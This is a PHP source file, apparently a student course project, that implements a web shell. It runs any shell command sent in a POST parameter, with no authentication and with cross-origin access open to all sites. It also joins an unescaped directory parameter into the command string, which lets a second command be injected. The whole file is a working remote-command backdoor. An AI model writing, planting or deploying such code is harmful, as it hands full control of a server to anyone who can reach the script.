<?php
/**
    * Nathan Johnson
    * 11/29/18
    * CSE 154
    * Section AK
    * This is the main function.  It runs through the program in a clean, readable way.
    * This function takes in the POST parameters "cmd" and "dir", and the GET parameter "check"
    * from the frontend javascript and outputs the result of the shell command (cmd), being sure to
    * execute the shell command from the current working directory (dir)
    * NOTE: currently, there is a bug in keeping track of the working directory in linux machines
    * however, it seems to work fine on macs. (untested on windows machines)
*/
function main(){
    header("Access-Control-Allow-Origin: *");
    if(isset($_POST["cmd"])){
        command_shell();
    }
    check_connection();
}

/**
    * This function takes post parameters from a front end script and processes them.
    * The cmd parameter is run as a system shell command. The dir parameter is passed between front end
    * and back end scripts to keep track of the working directory.
*/
function command_shell(){
    $command = $_POST["cmd"];
    if(isset($_POST["dir"])){
        $passed_dir = $_POST["dir"];
    } else {
        $passed_dir = "/";
    }
    if(substr($command, 0, 2) == "cd"){
        $dir = (shell_exec("cd " . $passed_dir . ";" . $command . ";pwd"));
    } else {
        $dir = $passed_dir;
    }
    $results = (shell_exec("cd " . $dir . ";" . $command));
    $post_obj = new stdClass();
    $post_obj->name = $results;
    $post_obj->dir = $dir;
    $post_json = json_encode($post_obj);
    header("Content-type: application/json");
    echo $post_json;
}

/**
    * This function takes in a GET parameter and responds, letting the frontend user know that the
    * webshell is ready to go.  When i have more time, this will be a login, and this function will
    * perform a one way hash and compare the hash to a stored hash.
    * @param check {BOOL} could be any variable.
*/
function check_connection(){
    if(isset($_GET["check"])){
        $my_obj = new stdClass();
        $my_obj->name = $_GET["check"];
        $my_json = json_encode($my_obj);
        header("Content-type: application/json");
        echo $my_json;
    }
}

error_reporting(E_ALL);
main();
?>
